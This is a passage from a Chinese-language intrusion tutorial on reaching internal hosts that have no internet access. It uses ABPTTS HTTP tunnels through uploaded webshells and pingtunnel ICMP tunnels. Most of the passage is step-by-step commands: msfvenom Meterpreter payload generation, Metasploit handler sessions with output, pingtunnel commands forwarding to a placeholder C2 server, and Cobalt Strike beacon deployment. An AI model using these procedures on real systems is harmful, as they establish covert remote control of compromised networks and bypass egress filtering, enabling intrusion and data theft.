    pip install pycrypto
    # 生成server端脚本
    python abpttsfactory.py -o server
    # 上传server端脚本到web服务器，客户端运行以下命令
    python abpttsclient.py -c server/config.txt -u "http://192.168.168.10/abptts.aspx" -f 127.0.0.1:7777/127.0.0.1:8888
    # abptts客户端监听127.0.0.1:7777，通过http://192.168.168.10/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888
2.生成bind类型的payload，通过webshell上传执行
    # 这里的rhost和lport是转发的目的IP和端口
    msfvenom -p windows/meterpreter/bind_tcp rhost=127.0.0.1 lport=8888 -f exe -o meterpreter.exe
3.启动msf监听，等待meterpreter执行上线
    #这里的rhost和lport是abptts客户端监听的IP和端口，msf所在主机必须能访问到这个IP和端口，这里msf和abptts在同一个主机上
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp
    payload => windows/meterpreter/bind_tcp
    msf5 exploit(multi/handler) > set rhost 127.0.0.1
    rhost => 127.0.0.1
    msf5 exploit(multi/handler) > set lport 7777
    lport => 7777
    msf5 exploit(multi/handler) > run
    [*] Started bind TCP handler against 127.0.0.1:7777
    [*] Sending stage (180291 bytes) to 127.0.0.1
    [*] Meterpreter session 1 opened (0.0.0.0:0 -> 127.0.0.1:7777) at 2020-04-27 04:50:25 -0400
    meterpreter > getuid
    Server username: DESKTOP-0AH7FQ0\admin
#### 0x3.1.2 上线cobaltstrike
**由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon
SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。**
1.通过正向的http隧道构建tcp连接
    # 配置abptts运行环境
    # 注意windows安装pycrypto库需要先安装依赖http://aka.ms/vcpython27
    pip install httplib2
    pip install pycrypto
    # 生成server端脚本
    python abpttsfactory.py -o server
    # 上传server端脚本到web服务器，客户端运行以下命令
    python abpttsclient.py -c server/config.txt -u "http://192.168.168.121/abptts.aspx" -f 127.0.0.1:7777/127.0.0.1:8888
    # abptts客户端监听127.0.0.1:7777，通过http://192.168.168.121/abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888
2.创建反向的listener  
3.生成父beacon  
4.上传父beacon到abptts客户端执行上线  
5.创建payload为tcp beacon的listener  
6.生成stageless的子beacon  
7.将生成的子beacon通过webshell上传执行
    # 可以通过webshell查看网络监听，确保子beacon执行成功
    netstat -ano | findstr 127.0.0.1:8888
8.在父beacon中连接abptts的监听ip和端口  
9.成功上线不能出网的webshell内网主机  
### 0x3.2 上线仅icmp协议出网的内网主机
**实战背景：**
通过某种信道获取了内网主机的shell，但是当前信道不适合做远控的通信信道（比如站库分离的网站，我们通过sql注入获取了数据库服务器的shell，但是数据库服务器只有icmp协议可以出网），tcp和udp等传输层协议不能出网，dns、http等应用层协议也不能出网，只有icmp协议可以出网。
#### 方案设计
icmp协议可以出网，可以利用icmp协议，构建反向的`TCP over ICMP`隧道或者`SOCKS over
ICMP`隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过icmp隧道转发tcp、udp、socks5连接。
#### 0x3.2.1 icmp隧道转发tcp上线metasploit
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
    ./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
    pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
    # 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
3.生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
    msfvenom -p windows/meterpreter/reverse_https lhost=127.0.0.1 lport=9999 -f exe -o meterpreter.exe
    # 这里的lhost和lport为icmp客户端监听ip和端口
4.启动msf监听，等待meterpreter执行上线
    # 这里的lhost和lport为icmp客户端转发到的ip和端口
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
    payload => windows/meterpreter/reverse_https
    msf5 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf5 exploit(multi/handler) > set lport 7777
    lport => 7777
    msf5 exploit(multi/handler) > run
    [*] Started HTTPS reverse handler on https://0.0.0.0:7777
    meterpreter > getuid
    Server username: DESKTOP-test0\admin
#### 0x3.2.2 icmp隧道转发socks上线metasploit
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
    ./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
    pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
    # 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
3.生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线
    msfvenom -p windows/meterpreter/reverse_https LHOST=c2_server_ip LPORT=8443 HttpProxyType=SOCKS HttpProxyHost=127.0.0.1 HttpProxyPort=6688 -f exe -o meterpreter.exe
4.启动msf监听，等待meterpreter执行上线
    msf5 > use exploit/multi/handler
    msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
    payload => windows/meterpreter/reverse_https
    msf5 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf5 exploit(multi/handler) > set lport 8443
    lport => 8443
    msf5 exploit(multi/handler) > run
    [*] Started HTTPS reverse handler on https://0.0.0.0:8443
    meterpreter > getuid
    Server username: DESKTOP-test0\admin
#### 0x3.2.3 icmp隧道转发tcp上线cobaltstrike
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
    ./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
    pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1
    # 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777
3.cobaltstrike创建listener  
    # https host和https port(c2)为icmp隧道客户端的监听ip和端口
    # https port(bind)为转发目的地址的端口
4.生成反向payload的beacon  
5.上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线  
#### 0x3.2.4 icmp隧道转发socks上线cobaltstrike
1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
    ./pingtunnel -type server -noprint 1 -nolog 1
2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
    pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1
    # 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址
3.cobaltstrike创建listener  
    # 这里的代理可以是socks或者http
    # 好像cobaltstrike不支持socks5代理，这里并不能成功上线
    # 这里也可以使用http代理，不过需要工具将http代理转为socks5代理，比如privoxy
4.选择创建的listener生成beacon上传到目标执行即可上线
## 0x4 总结
**内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。**
比如`ABPTTS + SOCKS服务 = reGeorg`
**内网渗透中的内网穿透的条件，能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现tcp/udp数据包的转发，即`TCP/UDP
over
something`隧道。如果没有现成的工具，可能需要我们自己开发。**比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发tcp/udp数据包，没有现成的工具，需要我们开发工具而已，隧道客户端将tcp/udp数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可